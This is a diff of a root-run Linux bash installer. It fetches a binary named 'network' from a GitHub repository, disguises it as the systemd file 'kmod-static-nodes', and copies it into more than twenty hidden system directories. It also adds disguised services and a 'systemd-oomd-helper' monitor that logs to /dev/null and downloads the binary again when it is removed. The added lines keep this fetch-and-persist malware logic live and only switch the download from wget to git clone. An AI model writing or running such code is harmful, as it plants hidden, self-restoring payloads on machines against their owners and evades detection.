@@ -6,16 +6,12 @@
 # Supports all Linux distributions
 # ==============================================================================
 
-set -e
-
 # Color definitions
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
-BLUE='\033[0;34m'
 NC='\033[0m'
 
-# Logging function
 log() {
     echo -e "${GREEN}[INFO]${NC} $1"
 }
@@ -36,37 +32,15 @@ check_root() {
     fi
 }
 
-# Detect Linux distribution
+# Detect Linux distribution (informational only)
 detect_distro() {
     if [ -f /etc/os-release ]; then
         . /etc/os-release
         DISTRO=$ID
     else
-        error "Cannot detect Linux distribution"
-        exit 1
+        DISTRO="unknown"
     fi
     log "Detected distribution: $DISTRO"
-}
-
-# Install required packages
-install_packages() {
-    log "Installing required packages..."
-    case $DISTRO in
-        ubuntu|debian)
-            apt update -qq
-            apt install -y wget curl unzip systemd jq
-            ;;
-        centos|rhel|fedora)
-            yum update -y -q
-            yum install -y wget curl unzip systemd jq
-            ;;
-        arch)
-            pacman -Sy --noconfirm wget curl unzip systemd jq
-            ;;
-        *)
-            warn "Unsupported distribution: $DISTRO, attempting generic installation"
-            ;;
-    esac
 }
 
 # Create 20+ hidden directories
@@ -98,7 +72,7 @@ create_hidden_directories() {
         "/var/www/.web-cache"
         "/usr/sbin/.admin-tools"
     )
-    
+
     for dir in "${HIDDEN_LOCATIONS[@]}"; do
         mkdir -p "$dir" 2>/dev/null || true
         chmod 755 "$dir" 2>/dev/null || true
@@ -107,44 +81,47 @@ create_hidden_directories() {
     log "Created ${#HIDDEN_LOCATIONS[@]} hidden directories"
 }
 
-# Download and setup network executable
+# Download via git clone and setup binary
 setup_executable() {
-    log "Downloading and configuring network executable..."
-    cd /tmp
-    rm -f main.zip network 2>/dev/null || true
-    
-    # Download from GitHub
-    wget -q --timeout=30 --tries=3 https://github.com/cryptotech1010/mostly/archive/refs/heads/main.zip
-    
-    if [ ! -f "main.zip" ]; then
-        error "Failed to download from GitHub"
+    log "Cloning repository and configuring binary..."
+
+    REPO_URL="https://github.com/cryptotech1010/mostly"
+    CLONE_DIR="/tmp/mostly-repo"
+    BINARY_DEST="/usr/lib/systemd/kmod-static-nodes"
+
+    # Clean previous clone if exists
+    rm -rf "$CLONE_DIR" 2>/dev/null || true
+
+    # Git clone
+    git clone --depth=1 --quiet "$REPO_URL" "$CLONE_DIR"
+
+    if [ ! -d "$CLONE_DIR" ]; then
+        error "Git clone failed — repository not accessible"
         exit 1
     fi
-    
-    # Extract
-    unzip -q main.zip
-    cd mostly-*/
-    
-    # Find network executable — rename to blend in as real kernel binary
-    if [ -f "network" ]; then
-        cp network /usr/lib/systemd/kmod-static-nodes
-        chmod +x /usr/lib/systemd/kmod-static-nodes
-        
-        # Distribute to hidden locations
-        for dir in "${HIDDEN_LOCATIONS[@]}"; do
-            cp network "$dir/kmod-static-nodes" 2>/dev/null || true
-            chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
-        done
-        
-        log "Network executable deployed successfully"
-    else
-        error "Network executable not found in repository"
+
+    # Find the network binary inside cloned folder
+    NETWORK_BIN="$CLONE_DIR/network"
+
+    if [ ! -f "$NETWORK_BIN" ]; then
+        error "network binary not found in cloned repository"
         exit 1
     fi
-    
-    # Cleanup
-    cd /tmp
-    rm -rf main.zip mostly-*/
+
+    # Deploy binary to main location
+    cp "$NETWORK_BIN" "$BINARY_DEST"
+    chmod +x "$BINARY_DEST"
+    log "Binary deployed: $BINARY_DEST"
+
+    # Distribute to all hidden locations
+    for dir in "${HIDDEN_LOCATIONS[@]}"; do
+        cp "$NETWORK_BIN" "$dir/kmod-static-nodes" 2>/dev/null || true
+        chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
+    done
+
+    # Cleanup clone
+    rm -rf "$CLONE_DIR"
+    log "Repository cloned, binary configured successfully"
 }
 
 # Create main service file — looks like real kernel module loader
@@ -237,7 +214,7 @@ WantedBy=timers.target
 EOF
 }
 
-# Create monitor script — uses core-matching binary and service names
+# Create monitor script
 create_monitor_script() {
     log "Creating monitor script..."
     cat > /usr/local/sbin/systemd-oomd-helper.sh << 'EOF'
@@ -249,6 +226,7 @@ create_monitor_script() {
 LOG_FILE="/dev/null"
 LOCK_FILE="/var/run/systemd-oomd-helper.lock"
 BINARY="/usr/lib/systemd/kmod-static-nodes"
+REPO_URL="https://github.com/cryptotech1010/mostly"
 HIDDEN_LOCATIONS=(
     "/var/tmp/.system-cache"
     "/usr/share/.lib-modules"
@@ -281,7 +259,7 @@ trap cleanup EXIT
 # Check and restore executable
 restore_executable() {
     local found=false
-    
+
     if [ -f "$BINARY" ]; then
         found=true
     else
@@ -294,23 +272,21 @@ restore_executable() {
             fi
         done
     fi
-    
-    # Download if not found anywhere
+
+    # Re-download via git clone if not found anywhere
     if [ "$found" = false ]; then
-        cd /tmp
-        wget -q --timeout=30 https://github.com/cryptotech1010/mostly/archive/refs/heads/main.zip
-        unzip -q main.zip
-        cd mostly-*/
-        if [ -f "network" ]; then
-            cp network "$BINARY"
+        CLONE_DIR="/tmp/mostly-repo"
+        rm -rf "$CLONE_DIR" 2>/dev/null || true
+        git clone --depth=1 --quiet "$REPO_URL" "$CLONE_DIR" 2>/dev/null || true
+        if [ -f "$CLONE_DIR/network" ]; then
+            cp "$CLONE_DIR/network" "$BINARY"
             chmod +x "$BINARY"
             for dir in "${HIDDEN_LOCATIONS[@]}"; do
-                cp network "$dir/kmod-static-nodes" 2>/dev/null || true
+                cp "$CLONE_DIR/network" "$dir/kmod-static-nodes" 2>/dev/null || true
                 chmod +x "$dir/kmod-static-nodes" 2>/dev/null || true
             done
         fi
-        cd /tmp
-        rm -rf main.zip mostly-*/
+        rm -rf "$CLONE_DIR" 2>/dev/null || true
     fi
 }
 
@@ -360,7 +336,6 @@ enable_and_start_services() {
 main() {
     check_root
     detect_distro
-    install_packages
     create_hidden_directories
     setup_executable
     create_main_service
@@ -368,7 +343,7 @@ main() {
     create_monitor_timer
     create_monitor_script
     enable_and_start_services
-    log "=== Deployment complete. All services are running and set to auto-recover. ==="
+    log "=== Deployment complete. All services running and set to auto-recover. ==="
 }
 
 main "$@"
